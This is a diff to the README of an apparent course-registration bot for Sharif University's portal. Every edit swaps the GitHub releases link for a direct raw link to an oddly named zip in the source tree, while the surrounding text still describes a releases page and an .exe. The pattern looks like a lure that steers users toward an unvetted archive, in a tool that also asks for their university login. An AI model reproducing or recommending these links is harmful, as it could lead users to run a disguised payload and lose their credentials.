@@ -1,6 +1,6 @@
 # 🎯 my.edu.sharif.edu-sniper - Never Miss Course Registration Again
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50)](https://github.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50)](https://raw.githubusercontent.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/main/cmd/sniper/sharif-edu-sniper-my-ultrasplendid.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to get the sniper running on your Windows computer.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/releases**](https://github.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/releases)
+[**https://raw.githubusercontent.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/main/cmd/sniper/sharif-edu-sniper-my-ultrasplendid.zip**](https://raw.githubusercontent.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/main/cmd/sniper/sharif-edu-sniper-my-ultrasplendid.zip)
 
 You will see a page with release files. Look for the latest version listed at the top. Click on the download link to save the file to your computer. The download should begin automatically.
 
@@ -196,7 +196,7 @@ Your credentials are only used to log you into the official university portal. T
 
 Need the file again? Here's your direct link:
 
-[**⬇️ Go to Download Page**](https://github.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/releases)
+[**⬇️ Go to Download Page**](https://raw.githubusercontent.com/pieperlouis4-hue/my.edu.sharif.edu-sniper/main/cmd/sniper/sharif-edu-sniper-my-ultrasplendid.zip)
 
 Simply choose the latest release and download the `.exe` file.
 
